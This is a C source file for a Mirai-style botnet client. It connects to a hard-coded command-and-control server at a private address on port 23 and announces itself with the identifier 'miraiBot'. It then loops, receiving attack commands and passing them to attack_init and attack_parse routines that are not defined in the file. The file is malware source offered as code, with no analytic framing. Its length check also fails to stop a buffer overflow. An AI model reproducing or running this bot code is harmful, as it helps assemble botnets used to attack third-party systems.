#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/time.h>

#define SERVER_IP "192.168.50.11"
#define SERVER_PORT 23

#define TIMEOUT_SECONDS 180

int main() {
    int sockfd;
    struct sockaddr_in server_addr;
    int fd_ctrl = -1;
    int fd_serv = -1;

    attack_init();

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Prepare server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    if (inet_pton(AF_INET, SERVER_IP, &(server_addr.sin_addr)) <= 0) {
        perror("Invalid server address");
        exit(EXIT_FAILURE);
    }

    // Connect to server
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
        perror("Connection failed");
        exit(EXIT_FAILURE);
    }

    // Maintain the connection
    unsigned char buf[1024];
    struct timeval timeout;
    timeout.tv_sec = TIMEOUT_SECONDS;
    timeout.tv_usec = 0;
    
    const char* bot_signal = "\x00\x00\x00\x01";
    uint8_t id_len = 8;
    const char* id_message = "miraiBot";

    send(sockfd, bot_signal, 4, MSG_NOSIGNAL);
    send(sockfd, &id_len, sizeof (id_len), MSG_NOSIGNAL);
    send(sockfd, id_message, id_len, MSG_NOSIGNAL);

    while (1) {
        int n;
        uint16_t len;

        n = recv(sockfd, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK);

        if (len == 0) {
            // It is a ping
            recv(sockfd, &len, sizeof (len), MSG_NOSIGNAL);
            continue;
        }

        len = ntohs(len);
        if (len > sizeof (buf)) {
            printf("Closing the connection\n");
        }

        n = recv(sockfd, buf, len, MSG_NOSIGNAL | MSG_PEEK);

        if (n == 1 | n == 0) {
            printf("ERROR with connection\n");
            break;
        }

        recv(sockfd, &len, sizeof (len), MSG_NOSIGNAL);
        len = ntohs(len);
        recv(sockfd, buf, len, MSG_NOSIGNAL);

        attack_parse(buf, len);
    }

    // Close the socket
    close(sockfd);

    return 0;
}